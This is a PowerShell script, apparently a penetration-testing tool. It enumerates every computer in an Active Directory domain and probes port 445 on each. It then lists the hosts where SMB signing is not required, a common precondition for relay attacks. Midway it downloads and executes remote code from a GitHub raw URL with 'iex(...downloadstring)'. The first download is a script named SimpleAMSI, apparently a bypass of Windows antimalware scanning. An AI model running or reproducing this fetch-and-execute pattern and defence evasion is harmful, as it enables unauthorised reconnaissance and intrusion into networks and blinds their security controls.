Write-Host "   ____ _               _     ____  __  __ ____ ____  _             _             "
Write-Host "  / ___| |__   ___  ___| | __/ ___||  \/  | __ ) ___|(_) __ _ _ __ (_)_ __   __ _ "
Write-Host " | |   | '_ \ / _ \/ __| |/ /\___ \| |\/| |  _ \___ \| |/ _`  | '_ \| | '_ \ / _`  |"
Write-Host " | |___| | | |  __/ (__|   <  ___) | |  | | |_) |__) | | (_| | | | | | | | | (_| |"
Write-Host "  \____|_| |_|\___|\___|_|\_\|____/|_|  |_|____/____/|_|\__, |_| |_|_|_| |_|\__, |"
Write-Host "                                                        |___/               |___/ "
Write-Host ""

$ErrorActionPreference = "SilentlyContinue"

Write-Host " Checking Hosts..." -ForegroundColor Yellow

# Get a list of all the computers in the domain
$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
$objSearcher.Filter = "(&(sAMAccountType=805306369))"
$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}

$jcurrentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }
$Computers = $Computers | Where-Object {-not ($_ -cmatch "$env:computername")}
$Computers = $Computers | Where-Object {-not ($_ -match "$env:computername")}
$Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
$Computers = $Computers | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}

$reachable_hosts = $null
$Tasks = $null
$total = $Computers.Count
$count = 0

$Tasks = $Computers | % {
	Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
	$tcpClient = New-Object System.Net.Sockets.TcpClient
	$asyncResult = $tcpClient.BeginConnect($_, 445, $null, $null)
	$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
	if($wait) {
		$tcpClient.EndConnect($asyncResult)
		$tcpClient.Close()
		$reachable_hosts += ($_ + "`n")
	} else {}
	$count++
}

Write-Progress -Activity "Checking Hosts..." -Completed

$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
$reachable_hosts = $reachable_hosts.Trim()
$reachable_hosts = $reachable_hosts | Where-Object { $_ -ne "" }
$reachable_hosts = $reachable_hosts | Sort-Object -Unique

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-SMBSigning.ps1')

# foreach($reachable_host in $reachable_hosts){Invoke-SMBEnum -Target $reachable_host -Action All}

if($reachable_hosts.Count -eq 1) {
	$smbsigningnotrequired = Get-SMBSigning -DelayJitter 10 -Target $reachable_hosts
	$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
	$smbsigningnotrequired = $smbsigningnotrequired.Trim()
	$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
	$smbsigningnotrequired = $smbsigningnotrequired | ForEach-Object { $_.ToString().Replace("SMB signing is not required on ", "") }
}

else{
	$formatted_hosts = '"' + ($reachable_hosts -join '","') + '"'
	$smbsigningnotrequired = Invoke-Expression "Get-SMBSigning -DelayJitter 10 -Targets @($formatted_hosts)" | Select-String "SMB signing is not required"
	$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
	$smbsigningnotrequired = $smbsigningnotrequired.Trim()
	$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
	$smbsigningnotrequired = $smbsigningnotrequired | ForEach-Object { $_.ToString().Replace("SMB signing is not required on ", "") }
}

$smbsigningnotrequired | Out-File $pwd\SMBSigningNotRequired.txt

Write-Host ""
Write-Host "SMB Signing not required:" -ForegroundColor Yellow
Write-Host ""
$smbsigningnotrequired
Write-Host ""
Write-Host "Output saved to: $pwd\SMBSigningNotRequired.txt"
Write-Host ""
